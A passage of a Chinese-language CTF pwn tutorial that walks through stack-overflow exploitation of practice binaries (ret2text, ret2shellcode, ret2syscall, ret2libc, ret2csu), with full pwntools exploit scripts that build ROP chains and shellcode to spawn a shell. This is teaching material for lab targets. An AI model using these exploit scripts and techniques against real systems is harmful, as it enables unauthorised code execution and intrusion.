src="https://i.loli.net/2021/04/20/m7hBtCnkbJIOAif.jpg" alt="main.jpg"></p> <p>从main函数看出<code>gets()</code>函数是漏洞点。还能在字符串里面找到<code>system和/bin/sh</code>字样。</p> <p><img src="https://i.loli.net/2021/04/20/wDry9XB7MEGYKSz.jpg" alt="后面函数位置.jpg"></p> <p>然后我们发现这个是一个无用的函数。</p> <p><img src="https://i.loli.net/2021/04/20/Y1AV7GL2EqxyMio.jpg" alt="需要部分.jpg"></p> <p>只需要这一部分就足够了。然后就测出偏移。基本上利用<code>pwndbg</code>自带的指令<code>cyclc</code>。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>cyclc <span class="token number">50</span> //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/2If1ZVtn9puCSYE.jpg" alt="报错得偏移.jpg"></p> <p>拿到相对于返回地址的偏移为112，也可以利用寄存器的参数来算偏移</p> <p><img src="https://i.loli.net/2021/04/20/oGgsztexIUlHmDu.jpg" alt="计算偏移.jpg"></p> <p>由于<code>esp = 0xffffce60</code>，<code>ebp = 0xffffcee8</code> ，又由于在<code>ida</code>里面<code>s[esp+0x1c]</code>,所以计算得s距离<code>ebp</code>的偏移为112.接下来就是写<code>exp</code>了.</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./ret2text&quot;</span><span class="token punctuation">)</span>

sys_addr <span class="token operator">=</span> <span class="token number">0x0804863A</span>

gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token string">&quot;b *0x0804869B\nc&quot;</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>sys_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">&quot;anything?&quot;</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>本地打通</p> <p><img src="https://i.loli.net/2021/04/20/HOB64EZ2at1DW3e.jpg" alt="本地执行打通.jpg"></p> <h6 id="ret2shellcode"><a href="#ret2shellcode" class="header-anchor">#</a> ret2shellcode</h6> <p>例题wiki的ret2shellcode</p> <p><img src="https://i.loli.net/2021/04/20/HxfRLlngMIh6zkW.jpg" alt="main.jpg"></p> <p>可以看到，输入gets。不过这次没有溢出的漏洞，也没有后门函数没法直接跳转到system上。而<code>buf</code>的地址却在<code>bss</code>段上.</p> <p><img src="https://i.loli.net/2021/04/20/beR8JkiC91cXYBy.jpg" alt="buf.jpg"></p> <p>这样我们也知道了<code>buf_addr = 0x0804a080</code>只要<code>buf</code>可以读写，那么我们就可以自己写一段<code>shellcode</code>来执行<code>system()</code></p> <p><img src="https://i.loli.net/2021/04/20/m3cxj9nDHXubaCq.jpg" alt="vmmap.jpg"></p> <p>通过<code>vmmap</code>我们看到了在程序<code>0x0804a000-0x0804b000</code>都可以读写，恰好<code>buf</code>的地址在这其中。接下来就是去寻找偏移了。</p> <p><img src="https://i.loli.net/2021/04/20/sdcM9FobHxu2Xva.jpg" alt="保护.jpg"></p> <p>看保护什么都没开。进行调试找偏移。</p> <p><img src="https://i.loli.net/2021/04/20/LWnMDhZmTlX8o4x.jpg" alt="通过gdb算偏移.jpg"></p> <p>在<code>gdb</code>里面可以看到<code>esp</code>和<code>ebp</code>的地址。然后通过计算得到偏移</p> <p><img src="https://i.loli.net/2021/04/20/Lia3oNmfxwO9Vlc.jpg" alt="计算出112.jpg"></p> <p>获取偏移也可以利用<code>pwntools</code>自带的指令cyclic在返回报错那块能看到最后的返回函数是<code>0x62616164</code>,然后得到偏移</p> <p><img src="https://i.loli.net/2021/04/20/nJrABIClsDENMmL.jpg" alt="填充.jpg"></p> <p>然后就是写<code>exp</code>了。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./ret2shellcode&quot;</span><span class="token punctuation">)</span>

buf_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>

padding <span class="token operator">=</span> <span class="token number">112</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#&lt;-这里利用pwntools的asm()函数来写shellcode.</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>padding<span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>buf_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;No system for you this time !!!&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io,&quot;b *0x80483d0\nc&quot;)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;ls&quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>运行得到shell</p> <p><img src="https://i.loli.net/2021/04/20/6ITdRsqWCaeA2hH.jpg" alt="通关.jpg"></p> <h6 id="ret2syscall"><a href="#ret2syscall" class="header-anchor">#</a> ret2syscall</h6> <p><code>ret2syscall</code>相当于是控制程序执行系统调用来获取<code>shell</code>,用系统调用号来区分入口函数</p> <p><img src="https://i.loli.net/2021/04/20/F5E7fObVjUGvxrI.jpg" alt="main.jpg"></p> <p>可以看出没有什么栈溢出漏洞。需要我们去构造写入<code>execve('/bin/sh')</code></p> <p>关于系统调用：</p> <blockquote><p><code>linux</code>的32位系统调用通过<code>int 80h</code>来实现的。</p> <p>应用程序调用系统调用的过程是:</p> <ol><li>把系统调用的编号存入<code>eax</code></li> <li>把函数参数存入其他通用寄存器</li> <li>触发0x80号中断(<code>int 0x80</code>）</li></ol></blockquote> <p>通过系统调用执行的是<code>execve(&quot;/bin/sh&quot;,NULL,NULL)(32位)</code></p> <p>然后看到<code>eax</code>的寄存器系统调用号，查看<code>execve</code>的系统调用号：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">cat</span> /usr/include/asm/unistd_32.h <span class="token operator">|</span> <span class="token function">grep</span> execve
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/Qqro4izcIjmTLah.jpg" alt="execve.jpg"></p> <div class="language-ipython line-numbers-mode"><pre class="language-text"><code>In[1]: hex(11)
Out[1]: '0xb'   
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>所以<code>exa</code>里面应该放<code>0xb</code>，然后现在需要的就是：</p> <blockquote><p><code>eax</code> = <code>0xb</code></p> <p><code>exb</code> = <code>/bin/sh</code></p> <p><code>ecx</code> = 0</p> <p><code>edx</code> = 0</p></blockquote> <p>然后就需要用到<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener noreferrer">ROPgadget<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="https://i.loli.net/2021/04/20/UjOEBGxZ6VsaoIS.jpg" alt="ROPgadget"></p> <p>然后找到利用区域：</p> <p><img src="https://i.loli.net/2021/04/20/5UHuxyD4gG7rBkA.jpg" alt="利用区"></p> <p>然后再找关于<code>ebx</code>的<code>ret</code></p> <p><img src="https://i.loli.net/2021/04/20/RPTktDw1xG7gIhK.jpg" alt="ROPgadget-exb.jpg">找到利用位置。</p> <p><img src="https://i.loli.net/2021/04/20/tFQpERwGTmkq6zb.jpg" alt="利用位置.jpg"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>padding <span class="token operator">=</span> <span class="token number">112</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>padding <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">,</span>pop_eax<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">,</span>pop_3exx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span>int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>至于为啥这样写，可以通过这个来解释：</p> <p><img src="https://i.loli.net/2021/04/20/b9DZano3Ey4Vj8Y.jpg" alt="栈情况.jpg">                利用这样依次填充</p> <p><img src="https://i.loli.net/2021/04/20/sbmBFvoIDVkHAZ4.jpg" alt="寄存器.jpg"></p> <p>使得我们能够顺利执行payload。</p> <img src="https://i.loli.net/2021/04/20/kRjFOQo84JKSmNt.jpg" alt="ROPgadget-binsh.jpg"> <p><img src="https://i.loli.net/2021/04/20/xJONKHLXWqd3GyU.jpg" alt="ROPgadget-int_0x80.jpg"></p> <p><img src="https://i.loli.net/2021/04/20/8LCqgXzeP7Q6cD5.jpg" alt="计算偏移.jpg"></p> <p>一如既往的计算。可以写<code>exp</code>了</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./ret2syscall&quot;</span><span class="token punctuation">)</span>

<span class="token comment">#ROPgadget to find pop-ret/int_0x80/binsh</span>
pop_eax <span class="token operator">=</span> <span class="token number">0x080bb196</span>
pop_3exx <span class="token operator">=</span> <span class="token number">0x0806eb90</span>
padding <span class="token operator">=</span> <span class="token number">112</span>
int_0x80 <span class="token operator">=</span> <span class="token number">0x08049421</span>
binsh_addr <span class="token operator">=</span> <span class="token number">0x080be408</span>

<span class="token comment">#write payload</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>padding <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">,</span>pop_eax<span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">,</span>pop_3exx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span>int_0x80<span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;What do you plan to do?&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io,&quot;b *0x804f650\nc&quot;)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p><img src="https://i.loli.net/2021/04/20/GouFTYP9RXzLQHg.jpg" alt="过关.jpg"></p> <h6 id="ret2libc"><a href="#ret2libc" class="header-anchor">#</a> ret2libc</h6> <p><img src="https://i.loli.net/2021/04/20/vCslEZXik16Ip9n.jpg" alt="main.jpg"></p> <p>由于没给后门函数，以及<code>libc库</code>而题中只给了<code>puts</code>函数，然而我们通过<code>objdump</code>可以看到能利用<code>puts</code>函数的<code>plt</code>表和<code>got</code>表</p> <p><img src="https://i.loli.net/2021/04/20/zDhO4ZAVCnxtWQi.jpg" alt="objdump.jpg"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;i386&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./ret2libc&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">.</span>g<span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./ret2libc&quot;</span><span class="token punctuation">)</span>

put_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">&quot;puts&quot;</span><span class="token punctuation">]</span>
put_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&quot;puts&quot;</span><span class="token punctuation">]</span>
start <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;_start&quot;</span><span class="token punctuation">]</span>

payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">112</span> <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">,</span>put_plt<span class="token punctuation">,</span>start<span class="token punctuation">,</span>put_got<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#&lt;-第一次泄露puts函数的地址</span>

io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">&quot;!?&quot;</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>

puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span>  LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;puts&quot;</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;system&quot;</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">]</span>

payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">112</span> <span class="token operator">*</span> <span class="token string">'A'</span><span class="token punctuation">,</span>system<span class="token punctuation">,</span><span class="token string">'0xdeadbeef'</span><span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;!?&quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>senline<span class="token punctuation">(</span><span class="token string">&quot;ls&quot;</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><h6 id="ret2csu"><a href="#ret2csu" class="header-anchor">#</a> ret2csu</h6> <p><img src="https://i.loli.net/2021/04/20/j7sIEWzQiVa2SdP.jpg" alt="main.jpg">主要函数里面由于read读入过多，可以让我们进行构造来获得shell</p> <p>传参的取处我们选择利用 <code>__libc_csu_init</code>函数的万能传参</p> <p><img src="https://i.loli.net/2021/04/20/CB47QW8lxud1htz.jpg" alt="csu_start.jpg"></p> <p>利用这里的pop来进行传参。</p> <p><img src="https://i.loli.net/2021/04/20/eubylkGLWoSOv7Q.jpg" alt="计算偏移.jpg">    在调试中进入write函数，看到<code>rbp</code>和<code>rsp</code>然后计算偏移</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>In <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rsp <span class="token operator">=</span> <span class="token number">0x7fffffffdc48</span>
In <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rbp <span class="token operator">=</span> <span class="token number">0x7fffffffdcd0</span>                                                
In <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> rbp<span class="token operator">-</span>rsp                                           Out<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">136</span>

In <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">)</span>                                         Out<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">0x88</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>写入一部分<code>exp</code>之后进行调试,可以看到<code>write</code>地址</p> <p><img src="https://i.loli.net/2021/04/20/dFj1GJoYcOD9hUq.jpg" alt="泄露的write地址.jpg"></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">&quot;debug&quot;</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">&quot;amd64&quot;</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">)</span>

io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">&quot;./level5&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">.</span>g<span class="token punctuation">:</span>
	gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
<span class="token comment">#io = remote(&quot;pwn2.jarvisoj.com&quot;,9884)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;./level5&quot;</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">&quot;libc-2.19.so&quot;</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&quot;write&quot;</span><span class="token punctuation">]</span>
read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">&quot;read&quot;</span><span class="token punctuation">]</span>
vulner_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;vulnerable_function&quot;</span><span class="token punctuation">]</span>
bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>

csu_op <span class="token operator">=</span> <span class="token number">0x00400690</span>
csu_ed <span class="token operator">=</span> <span class="token number">0x004006AA</span>

<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>r12<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">global</span> csu_ed<span class="token punctuation">,</span>csu_op
	payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x88</span><span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">,</span>csu_ed<span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>r12<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>csu_op<span class="token punctuation">,</span><span class="token number">0x38</span><span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">,</span>ret<span class="token punctuation">]</span><span class="token punctuation">)</span>
	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Input:\n&quot;</span><span class="token punctuation">)</span>
	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
	sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

csu<span class="token punctuation">(</span>write_got<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>write_got<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>vulner_addr<span class="token punctuation">)</span>
write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> write_addr <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
mprotect_addr <span class="token operator">=</span> libc <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&quot;mprotect&quot;</span><span class="token punctuation">]</span>

payload2 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>mprotect_addr<span class="token punctuation">,</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#&lt;-通过mprotect函数的来写入bss段，然后再执行mprotect，getshell</span>
csu<span class="token punctuation">(</span>read_got<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>vulner_addr<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>


csu<span class="token punctuation">(</span>bss_addr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x600000</span><span class="token punctuation">,</span> bss_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'bss_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span 